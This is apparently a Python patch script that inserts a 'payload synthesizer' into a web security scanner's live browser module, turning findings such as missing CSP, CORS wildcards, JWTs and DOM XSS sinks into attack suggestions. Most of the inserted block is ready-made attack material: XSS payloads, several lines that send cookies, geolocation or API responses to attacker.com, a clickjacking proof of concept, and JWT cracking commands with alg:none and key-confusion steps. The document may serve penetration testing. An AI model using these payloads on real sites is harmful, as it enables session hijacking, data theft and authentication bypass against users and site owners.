import re

with open('core/live_browser.py', 'r') as f:
    content = f.read()

# Replace the specific_suggestions block with the new extensive one
start_str = "        # Generate Context-Aware AI Suggestions Based on Current Findings"
end_str = "        suggestions_html_b64 = base64.b64encode(suggestions_html.encode('utf-8')).decode('utf-8')"

start_idx = content.find(start_str)
end_idx = content.find(end_str)

new_block = """        # Build Exact Payload Synthesizer based on specific raw finding types
        specific_suggestions = {}
        for f in self.live_findings:
            t = f.get('type', '')
            if 'MISSING_CONTENT_SECURITY_POLICY' in t or 'CSP_MISSING' in t or 'MISSING_CSP' in t:
                specific_suggestions['CSP'] = {
                    'title': '🛡️ No CSP — Any XSS is Fully Exploitable',
                    'color': '#ff3333',
                    'text': '- <strong>Vulnerability:</strong> No Content-Security-Policy header on any page.<br>- <strong>Impact:</strong> The browser executes ANY injected script — inline, external, or via data: URI.<br>- <strong>Attack Strategy:</strong> Prioritize finding Reflected/Stored XSS. Without CSP there is zero secondary defense.<br>- <strong>Classic Payloads:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">&lt;script&gt;alert(document.domain)&lt;/script&gt;<br>&lt;img src=x onerror=alert(1)&gt;<br>&lt;svg/onload=fetch(`https://attacker.com/?c=${document.cookie}`)&gt;</code>'
                }
            elif 'MISSING_X_FRAME_OPTIONS' in t or 'X_FRAME' in t:
                specific_suggestions['CLICKJACKING'] = {
                    'title': '🖼️ Clickjacking — Missing X-Frame-Options',
                    'color': '#ff9900',
                    'text': '- <strong>Vulnerability:</strong> Pages can be embedded in a &lt;iframe&gt; on an attacker site.<br>- <strong>Attack:</strong> Overlay a transparent iframe over a fake UI to trick users into clicking sensitive actions (fund transfers, account deletion, password change).<br>- <strong>PoC (Clickjacking Test):</strong><br><code style="color:#ffaa00; background:#111; padding:2px; display:block; margin:4px 0;">&lt;style&gt;iframe{opacity:0.5;position:absolute;top:0;left:0;width:100%;height:100%;z-index:99}&lt;/style&gt;<br>&lt;iframe src="TARGET_URL"&gt;&lt;/iframe&gt;</code>'
                }
            elif 'MISSING_X_CONTENT_TYPE_OPTIONS' in t or 'X_CONTENT_TYPE' in t:
                specific_suggestions['MIME'] = {
                    'title': '📄 MIME Sniffing — Missing X-Content-Type-Options',
                    'color': '#ffff00',
                    'text': '- <strong>Vulnerability:</strong> Browser may MIME-sniff responses and execute them differently.<br>- <strong>Attack Vector:</strong> If you can upload a file with polyglot content (e.g. an image that is also valid JS/HTML), the browser may execute it as script.<br>- <strong>Strategy:</strong> Test file upload endpoints with polyglot payloads:<br><code style="color:#ffff66; background:#111; padding:2px; display:block; margin:4px 0;">GIF89a/*&lt;script&gt;alert(1)&lt;/script&gt;*/</code>'
                }
            elif 'MISSING_PERMISSIONS_POLICY' in t or 'PERMISSIONS_POLICY' in t:
                specific_suggestions['PERMISSIONS'] = {
                    'title': '🎤 Missing Permissions-Policy (Camera/Mic/Geolocation)',
                    'color': '#ffff00',
                    'text': '- <strong>Vulnerability:</strong> No Permissions-Policy restricts browser APIs.<br>- <strong>Impact:</strong> Malicious iframes or XSS payloads can silently request camera, microphone, geolocation, or payment access.<br>- <strong>Combined with XSS:</strong><br><code style="color:#ffff66; background:#111; padding:2px; display:block; margin:4px 0;">navigator.geolocation.getCurrentPosition(p=>fetch(`https://attacker.com/?lat=${p.coords.latitude}&lng=${p.coords.longitude}`))</code>'
                }
            elif 'MISSING_REFERRER_POLICY' in t or 'REFERRER_POLICY' in t:
                specific_suggestions['REFERRER'] = {
                    'title': '🔗 Sensitive URL Leakage — Missing Referrer-Policy',
                    'color': '#ffff00',
                    'text': '- <strong>Vulnerability:</strong> The full URL (including query params) is sent in the Referer header to external sites.<br>- <strong>Leak Scenarios:</strong><br>• User visits /account?token=abc123 → clicks external link → token leaked in Referer<br>• Password reset tokens, session IDs in URLs → leaked to third-party analytics<br>- <strong>Recommendation:</strong> Add Referrer-Policy: strict-origin-when-cross-origin'
                }
            elif 'CORS_WILDCARD' in t:
                specific_suggestions['CORS'] = {
                    'title': '🚪 CORS Wildcard Abuse (Access-Control-Allow-Origin: *)',
                    'color': '#ff9900',
                    'text': '- <strong>Vulnerability:</strong> Any origin can read responses from this API.<br>- <strong>Constraint:</strong> Browsers block credentials (cookies/Auth headers) with wildcard ACAO. Useful for exfiltrating unauthenticated or session-independent data.<br>- <strong>Exploit (host on attacker server):</strong><br><code style="color:#ffaa00; background:#111; padding:2px; display:block; margin:4px 0;">&lt;script&gt;<br>  fetch("TARGET_URL")<br>    .then(r => r.text())<br>    .then(d => fetch("https://attacker.com/log?d=" + btoa(d)));<br>&lt;/script&gt;</code>'
                }
            elif 'JSON_WEB_TOKEN' in t or 'JWT_TOKEN' in t:
                specific_suggestions['JWT'] = {
                    'title': '🔑 JWT Found — Test for Algorithm Confusion & Weak Secrets',
                    'color': '#ff3333',
                    'text': '- <strong>Finding:</strong> JWT token detected in traffic/response.<br>- <strong>Test 1 — Algorithm: none attack:</strong> Decode the JWT (base64), change "alg":"HS256" to "alg":"none", strip the signature. If accepted → critical auth bypass.<br>- <strong>Test 2 — Weak secret brute-force:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">hashcat -a 0 -m 16500 &lt;jwt&gt; wordlist.txt<br>python3 jwt_tool.py &lt;jwt&gt; -C -d wordlist.txt</code><br>- <strong>Test 3 — RS256 → HS256 confusion:</strong> Sign with the server\'s public key as the HS256 secret → server may accept it.'
                }
            elif 'CONFIRMED_RUNTIME_DOM_SINK_FUNCTION_CTOR' in t or 'EVAL' in t:
                specific_suggestions['DOM_XSS_EVAL'] = {
                    'title': '🌐 Confirmed DOM XSS — Function() Constructor / Eval Sink',
                    'color': '#ff3333',
                    'text': '- <strong>Vulnerability:</strong> Data flows into new Function() or eval().<br>- <strong>Payloads (break out of any surrounding string context):</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">alert(1) (direct injection)<br>\\");alert(1);// (string escape)<br>\'}-alert(1)-x={ (object context)</code><br>- <strong>Data exfil:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">fetch(`https://attacker.com/?d=${btoa(document.cookie)}`)</code>'
                }
            elif 'CONFIRMED_RUNTIME_DOM_SINK_INNERHTML' in t or 'OUTERHTML' in t:
                specific_suggestions['DOM_XSS_HTML'] = {
                    'title': '🌐 Confirmed DOM XSS — innerHTML/outerHTML Sink',
                    'color': '#ff3333',
                    'text': '- <strong>Vulnerability:</strong> Untrusted data flows into HTML parser sink.<br>- <strong>Constraint:</strong> &lt;script&gt; tags do NOT execute via innerHTML. Use event-handler elements.<br>- <strong>Payloads:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">&lt;img src=x onerror=alert(document.domain)&gt;<br>&lt;svg/onload=alert(1)&gt;<br>&lt;details/open/ontoggle=alert(1)&gt;</code><br>- <strong>Cookie steal:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">&lt;img src=x onerror=fetch(`//attacker.com?c=${document.cookie}`)&gt;</code>'
                }

        if not specific_suggestions:
            suggestions_html += \"\"\"
            <div style="margin-top:20px; padding:15px; border:1px solid #333; background:#111; color:#888; text-align:center; border-radius:4px; font-size:11px;">
                <i>No vulnerabilities detected yet. The AI Engine will provide exact exploitation payloads tailored to your findings here.</i>
            </div>
            </div>
            \"\"\"
        else:
            suggestions_html += \"\"\"
            <div style="margin-bottom:20px;">
                <div style="font-size:12px; color:#fff; border-bottom:1px solid #444; padding-bottom:4px; margin-bottom:10px;"><strong>🎯 Exact Payload Synthesizer</strong></div>
            \"\"\"

            for key, block in specific_suggestions.items():
                title = block['title']
                color = block['color']
                text = block['text']
                
                suggestions_html += f\"\"\"
                <details open style="margin-bottom:6px; background:#1a1a24; border:1px solid #333; border-radius:4px;">
                    <summary style="cursor:pointer; padding:8px; font-size:11px; font-weight:bold; color:{color};">{title}</summary>
                    <div style="padding:8px; font-size:10px; color:#bbb; border-top:1px solid #333; line-height:1.6;">
                        {text}
                    </div>
                </details>
                \"\"\"

            suggestions_html += \"\"\"
            </div>
            </div>
            \"\"\"
"""

new_content = content[:start_idx] + new_block + content[end_idx:]

with open('core/live_browser.py', 'w') as f:
    f.write(new_content)

